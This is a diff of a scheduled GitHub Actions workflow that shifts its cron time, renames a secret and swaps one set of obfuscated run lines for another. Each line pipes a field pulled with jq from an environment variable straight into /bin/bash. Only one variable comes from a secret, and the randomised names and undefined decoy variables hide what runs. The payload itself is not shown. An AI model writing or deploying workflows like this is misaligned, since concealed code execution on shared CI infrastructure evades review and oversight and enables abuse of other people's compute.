@@ -2,8 +2,8 @@ name: yunxiaoxi2121
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 2/6 * * *'
-jobs:  # 19640
+    - cron: '34 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,16 +11,19 @@ jobs:  # 19640
       - uses: actions/checkout@v4
       - name: yunxiaoxi2121
         env:
-          o6: ${{ secrets.o6 }}
+          dv49: ${{ secrets.dv49 }}
         run: |
-          echo $o6 | jq -r .tzcge41 | /bin/bash
-          echo $jar77537 | jq -r .y6 | /bin/bash
-          echo $ftp41 | jq -r .wvdvg29 | /bin/bash
-          echo $bj5 | jq -r .mrnf82 | /bin/bash
-          echo $g6649 | jq -r .vys86988 | /bin/bash
-          echo $dd9 | jq -r .uhl33534 | /bin/bash
-          echo $kt683 | jq -r .rhd12 | /bin/bash
-          echo $can7768 | jq -r .qb295 | /bin/bash
-          echo $yd2527 | jq -r .wmf1 | /bin/bash
-          echo $sbenq01318 | jq -r .zdyz5 | /bin/bash
+          echo $dv49 | jq -r .gzz11530 | /bin/bash
+          echo $qj51557 | jq -r .bq1 | /bin/bash
+          echo $hwi76 | jq -r .f1 | /bin/bash
+          echo $lph60 | jq -r .oej250 | /bin/bash
+          echo $zjol397 | jq -r .abeh9 | /bin/bash
+          echo $pg1 | jq -r .m75 | /bin/bash
+          echo $jxw84914 | jq -r .yn575 | /bin/bash
+          echo $pjgbk395 | jq -r .xm045 | /bin/bash
+          echo $so862 | jq -r .banc01033 | /bin/bash
+          echo $js2 | jq -r .qt5 | /bin/bash
+          echo $tmp7 | jq -r .qkfu73712 | /bin/bash
+          echo $obumo82 | jq -r .ec3239 | /bin/bash
+          echo $iw9616 | jq -r .dyyjx8 | /bin/bash
 
